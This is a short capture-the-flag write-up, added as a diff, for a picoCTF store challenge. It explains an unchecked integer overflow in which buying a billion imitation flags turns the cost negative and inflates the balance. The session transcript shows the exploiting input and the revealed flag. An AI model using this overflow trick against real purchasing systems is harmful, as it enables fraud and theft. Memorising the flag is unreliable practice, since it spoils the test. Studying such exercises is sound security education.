@@ -1,0 +1,57 @@
+The vulnerability lies in the fact that we can buy "fake" flags at a much lower cost than a real flag.
+Also, there are no arithmetic overflow checks, so we can buy a large number of fake flags to overflow the cost and make it negative,
+which will increase our balance.
+
+We can do this until we have enough funds to buy a real flag.
+
+$ nc 2018shell3.picoctf.com 60893
+Welcome to the Store App V1.0
+World's Most Secure Purchasing App
+
+[1] Check Account Balance
+
+[2] Buy Stuff
+
+[3] Exit
+
+ Enter a menu selection
+2
+Current Auctions
+[1] I Can't Believe its not a Flag!
+[2] Real Flag
+1
+Imitation Flags cost 1000 each, how many would you like?
+1000000000
+
+Your total cost is: -727379968
+
+Your new balance: 727381068
+
+Welcome to the Store App V1.0
+World's Most Secure Purchasing App
+
+[1] Check Account Balance
+
+[2] Buy Stuff
+
+[3] Exit
+
+ Enter a menu selection
+2
+Current Auctions
+[1] I Can't Believe its not a Flag!
+[2] Real Flag
+2
+A genuine Flag costs 100000 dollars, and we only have 1 in stock
+Enter 1 to purchase1
+YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dee04605}
+Welcome to the Store App V1.0
+World's Most Secure Purchasing App
+
+[1] Check Account Balance
+
+[2] Buy Stuff
+
+[3] Exit
+
+ Enter a menu selection
